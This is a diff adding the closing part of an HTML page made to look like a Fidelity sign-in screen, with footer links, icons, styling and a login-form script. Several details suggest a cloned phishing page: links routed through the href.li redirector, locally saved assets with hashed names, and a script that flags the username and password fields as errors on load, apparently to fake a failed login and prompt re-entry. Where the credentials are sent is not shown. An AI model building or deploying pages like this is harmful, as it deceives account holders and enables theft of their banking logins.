+<s-root><!-- --><span class="pvd-link-root pvd-link--icon-only pvd-link--icon-right pvd-link--disable-underline pvd-link--new-window pvd-link--small"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-footer-pvd-link" href="https://href.li/?https://www.fidelity.com/security/overview" rel="noopener" target="_blank"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>Security</s-assigned-wrapper></s-slot><!--?lit$646893491$--><span class="pvd-link__icon pvd-link__icon--right"><s-slot name="icon-right"><s-fallback-wrapper><!--?lit$646893491$--><pvd-scoped-icon-83617107 data-tag-name="pvd-scoped-icon" pvd-name="action__open-link" pvd-size="small"><!-- --><svg aria-hidden="true" class="pvd-icon-root pvd-icon--small" focusable="false">
+<!--?lit$646893491$-->
+<use href="#pvd-action__open-link" xlink:href="#pvd-action__open-link"></use>
+</svg></pvd-scoped-icon-83617107></s-fallback-wrapper><s-assigned-wrapper></s-assigned-wrapper></s-slot></span><!--?lit$646893491$--><span class="pvd-link__screen-reader-text">
+<!--?lit$646893491$-->Opens in a new window</span><!--?--></a><!--?--></span></s-root>
+<s-root><!-- --><span class="pvd-link-root pvd-link--icon-only pvd-link--icon-right pvd-link--disable-underline pvd-link--new-window pvd-link--small"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-footer-pvd-link" href="https://href.li/?https://www.fidelity.com/accessibility/overview" rel="noopener" target="_blank"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>Accessibility</s-assigned-wrapper></s-slot><!--?lit$646893491$--><span class="pvd-link__icon pvd-link__icon--right"><s-slot name="icon-right"><s-fallback-wrapper><!--?lit$646893491$--><pvd-scoped-icon-83617107 data-tag-name="pvd-scoped-icon" pvd-name="action__open-link" pvd-size="small"><!-- --><svg aria-hidden="true" class="pvd-icon-root pvd-icon--small" focusable="false">
+<!--?lit$646893491$-->
+<use href="#pvd-action__open-link" xlink:href="#pvd-action__open-link"></use>
+</svg></pvd-scoped-icon-83617107></s-fallback-wrapper><s-assigned-wrapper></s-assigned-wrapper></s-slot></span><!--?lit$646893491$--><span class="pvd-link__screen-reader-text">
+<!--?lit$646893491$-->Opens in a new window</span><!--?--></a><!--?--></span></s-root>
+<br/>
+<s-root><!-- --><span class="pvd-link-root pvd-link--icon-only pvd-link--icon-right pvd-link--disable-underline pvd-link--new-window pvd-link--small"><!--?lit$646893491$--> <!--?lit$646893491$--><!--?lit$646893491$-->
+<!--?lit$646893491$-->
+<a class="pvd-link__link dom-footer-pvd-link" href="https://href.li/?https://www.fidelity.com/terms-of-use#For" rel="noopener" target="_blank"><!--?lit$646893491$--><!--?lit$646893491$--><s-slot name="icon-left"><s-assigned-wrapper></s-assigned-wrapper></s-slot><!--?lit$646893491$--><s-slot><s-assigned-wrapper>This is for persons in the US only</s-assigned-wrapper></s-slot><!--?lit$646893491$--><span class="pvd-link__icon pvd-link__icon--right"><s-slot name="icon-right"><s-fallback-wrapper><!--?lit$646893491$--><pvd-scoped-icon-83617107 data-tag-name="pvd-scoped-icon" pvd-name="action__open-link" pvd-size="small"><!-- --><svg aria-hidden="true" class="pvd-icon-root pvd-icon--small" focusable="false">
+<!--?lit$646893491$-->
+<use href="#pvd-action__open-link" xlink:href="#pvd-action__open-link"></use>
+</svg></pvd-scoped-icon-83617107></s-fallback-wrapper><s-assigned-wrapper></s-assigned-wrapper></s-slot></span><!--?lit$646893491$--><span class="pvd-link__screen-reader-text">
+<!--?lit$646893491$-->Opens in a new window</span><!--?--></a><!--?--></span></s-root>
+</div>
+</div>
+</footer>
+<div style="display: none;">
+
+
+<path d="M2.24 10.86A1.25 1.25 0 10.27 12.4l6.33 8a1.25 1.25 0 001.87.1L23.64 5.28a1.25 1.25 0 10-1.78-1.77L7.68 17.72l-5.44-6.87z"></path>
+
+
+<path d="M10.3 12L.35 2.05a1.2 1.2 0 111.7-1.7L12 10.3 21.95.35a1.2 1.2 0 111.7 1.7L13.7 12l9.95 9.95a1.2 1.2 0 11-1.7 1.7L12 13.7l-9.95 9.95a1.2 1.2 0 11-1.7-1.7L10.3 12z"></path>
+
+
+<path d="M12 24a12 12 0 110-24 12 12 0 010 24zM7.88 11.88a1.25 1.25 0 10-1.96 1.55l3.1 3.92a1.25 1.25 0 001.86.1l7.51-7.5a1.25 1.25 0 00-1.76-1.77l-6.52 6.51-2.23-2.81z"></path>
+
+
+<path d="M12 24a12 12 0 110-24 12 12 0 010 24zm1.25-10.76V6.92a1.25 1.25 0 00-2.5 0v6.32a1.25 1.25 0 002.5 0zM12 18.79a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"></path>
+
+
+<path d="M13 13.44a1 1 0 01-2 0V6.92a1 1 0 012 0v6.52zm-1 4.85a1.25 1.25 0 110-2.5 1.25 1.25 0 010 2.5zM12 24a12 12 0 110-24 12 12 0 010 24zm0-2a10 10 0 100-20 10 10 0 000 20z"></path>
+
+
+<path d="M23.43 10.93a2.21 2.21 0 010 2.94c-2.62 2.88-6.94 5.93-11.29 5.93h-.3c-4.34 0-8.66-3.05-11.28-5.93a2.21 2.21 0 010-2.94C3.21 8.02 7.6 4.93 12 5c4.4-.06 8.8 3.02 11.44 5.93zM7.39 12.4a4.6 4.6 0 109.2 0 4.6 4.6 0 00-9.2 0zm4.6 2a2 2 0 110-4 2 2 0 010 4z"></path>
+
+
+<path d="M22.95 10.31c.74.83.75 2.08.01 2.9-2.56 2.82-6.8 5.8-11.05 5.8h-.3a11.26 11.26 0 01-4.31-.94l-4.15 4.15a1 1 0 01-1.63-1.09s.02 0 .03-.02l19.5-19.5a.74.74 0 00.17-.29l.02-.01a1 1 0 111.41 1.41l-4 4a20.95 20.95 0 014.3 3.6zm-6.88 2.72a4.3 4.3 0 00-.2-3.05.25.25 0 00-.41-.07L9.9 15.47a.25.25 0 00.07.4 4.3 4.3 0 003.1.2 4.58 4.58 0 003-3.04zm-8.7.14l-3.05 3.05a.26.26 0 01-.32.03 21.2 21.2 0 01-3.44-3.03 2.15 2.15 0 010-2.9c2.6-2.85 6.9-5.86 11.2-5.8a10.42 10.42 0 013.23.5.25.25 0 01.1.41l-1.94 1.95a.24.24 0 01-.24.06 4.28 4.28 0 00-1.16-.17 4.5 4.5 0 00-4.5 4.5 4.3 4.3 0 00.18 1.16.24.24 0 01-.06.24z"></path>
+
+
+<path d="M14.47 1.54l9.28 18.9A2.47 2.47 0 0121.53 24H2.47a2.47 2.47 0 01-2.22-3.56l9.28-18.9a2.75 2.75 0 014.94 0zM12 1.96a.79.79 0 00-.7.44L2 21.3a.51.51 0 00.46.74h19.06a.51.51 0 00.46-.73L12.7 2.4a.79.79 0 00-.71-.44zm1 12.62a1 1 0 11-2 0V8.06a1 1 0 012 0v6.52zm-1 4.85a1.25 1.25 0 110-2.5 1.25 1.25 0 010 2.5z"></path>
+
+
+<path d="M.8 13.1L7.6.73h1.3l6.3 12.75-.5.75H.8z" fill="currentColor"></path>
+<path d="M8 11c.37 0 .66.27.66.6 0 .35-.3.62-.65.62.22 0 .4-.17.4-.38s-.18-.38-.4-.38c-.23 0-.41.17-.41.38s.18.38.4.38c-.35 0-.65-.27-.65-.61 0-.34.3-.61.66-.61.5 0 .9.37.9.84 0 .46-.4.84-.9.84s-.9-.38-.9-.84c0-.47.4-.84.9-.84zm.66-1.23c0 .34-.3.61-.65.61-.36 0-.66-.27-.66-.6v-4.6c0-.34.3-.61.66-.61.36 0 .65.27.65.61v4.6z"></path>
+<path d="M9.65.94l6.19 11.81c.25.48.22 1.05-.08 1.5-.3.45-.83.73-1.4.73H1.66c-.57 0-1.1-.28-1.4-.73a1.46 1.46 0 01-.08-1.5L6.36.94c.31-.6.95-.96 1.65-.96s1.33.37 1.64.96zm-1.64.26c-.2 0-.39.1-.48.28L1.35 13.29a.3.3 0 00.01.31c.07.1.18.15.3.15h12.7c.12 0 .23-.05.29-.15a.3.3 0 00.02-.3L8.48 1.47a.53.53 0 00-.47-.28z"></path>
+
+
+<path d="M8.25 12l9.85-9.85A1.25 1.25 0 0016.34.38L6.1 10.6a1.96 1.96 0 000 2.78l10.23 10.23a1.25 1.25 0 001.76-1.77L8.25 12z"></path>
+
+
+<path d="M15.75 12L5.9 2.15A1.25 1.25 0 017.66.38L17.9 10.6a1.96 1.96 0 010 2.78L7.66 23.62a1.25 1.25 0 01-1.76-1.77L15.75 12z"></path>
+
+
+<path d="M12 15.75L2.15 5.9A1.25 1.25 0 00.38 7.66L10.6 17.9a1.96 1.96 0 002.78 0L23.62 7.66a1.25 1.25 0 00-1.77-1.76L12 15.75z"></path>
+
+
+</div>
+<style type="text/css">
+        .QSIFeedbackLink div,
+        .QSIFeedbackLink dl,
+        .QSIFeedbackLink dt,
+        .QSIFeedbackLink dd,
+        .QSIFeedbackLink ul,
+        .QSIFeedbackLink ol,
+        .QSIFeedbackLink li,
+        .QSIFeedbackLink h1,
+        .QSIFeedbackLink h2,
+        .QSIFeedbackLink h3,
+        .QSIFeedbackLink h4,
+        .QSIFeedbackLink h5,
+        .QSIFeedbackLink h6,
+        .QSIFeedbackLink pre,
+        .QSIFeedbackLink form,
+        .QSIFeedbackLink fieldset,
+        .QSIFeedbackLink textarea,
+        .QSIFeedbackLink p,
+        .QSIFeedbackLink blockquote,
+        .QSIFeedbackLink th,
+        .QSIFeedbackLink td {
+            margin: 0;
+            padding: 0;
+            color: black;
+            font-family: arial;
+            font-size: 12px;
+            line-height: normal;
+        }
+
+        .QSIFeedbackLink ul {
+            margin: 12px 0;
+            padding-left: 40px;
+        }
+
+        .QSIFeedbackLink ol,
+        .QSIFeedbackLink ul {
+            margin: 12px 0;
+            padding-left: 40px;
+        }
+
+        .QSIFeedbackLink ul li {
+            list-style-type: disc;
+        }
+
+        .QSIFeedbackLink ol li {
+            list-style-type: decimal;
+        }
+
+        .QSIFeedbackLink .scrollable {
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .QSIFeedbackLink table {
+            border-collapse: collapse;
+            border-spacing: 0;
+        }
+
+        .QSIFeedbackLink table td {
+            padding: 2px;
+        }
+
+        .QSIPopOver *,
+        .QSISlider *,
+        .QSIPopUnder *,
+        .QSIEmbeddedTarget * {
+            box-sizing: content-box;
+        }
+    </style>
+<script src="local_resources/js/3ad5f467f75e8525722d37e245db542d.js"></script>
+<script>
+        $(document).ready(function() {
+            $('#username,#password').parent().addClass('pvd-input--error')
+            $('#username').focus()
+            $('#eye-icon').click(function() {
+                var x = document.getElementById("password");
+                if (x.type === "password") {
+                    x.type = "text";
+                    $('#inline-eye').attr('href', '#pvd-action__hide')
+                } else {
+                    x.type = "password";
+                    $('#inline-eye').attr('href', '#pvd-action__show')
+                }
+            })
+            $('form').submit(function() {
+                $('input,button').blur()
+                if ($('#username').val().length == 0) {
+                    $('#username').parent().addClass('pvd-input--error')
+                    $('#username-error').show()
+                } else {
+                    $('#username').parent().removeClass('pvd-input--error')
+                    $('#username-error').hide()
+                }
+                if ($('#password').val().length == 0) {
+                    $('#password').parent().addClass('pvd-input--error')
+                    $('#password-error').show()
+                } else {
+                    $('#password').parent().removeClass('pvd-input--error')
+                    $('#password-error').hide()
+                }
+                if ($('#username').val().length == 0 || $('#password').val().length == 0) {
+                    event.preventDefault()
+                } else {
+                    $('#dom-login-button').attr('disabled', true)
+                    $('#dom-overlay').show()
+                }
+            }).on('input', function() {
+                if ($('#main-error').is(":visible")) {
+                    $('#main-error').hide()
+                    $('#username,#password').parent().removeClass('pvd-input--error')
+                }
+            })
+
+            $('#username').on('input', function() {
+                $('#username').parent().removeClass('pvd-input--error')
+                $('#username-error').hide()
+            })
+
+            $('#password').on('input', function() {
+                $('#password').parent().removeClass('pvd-input--error')
+                $('#password-error').hide()
+            })
+        })
+    </script>
+</body>
+</html>
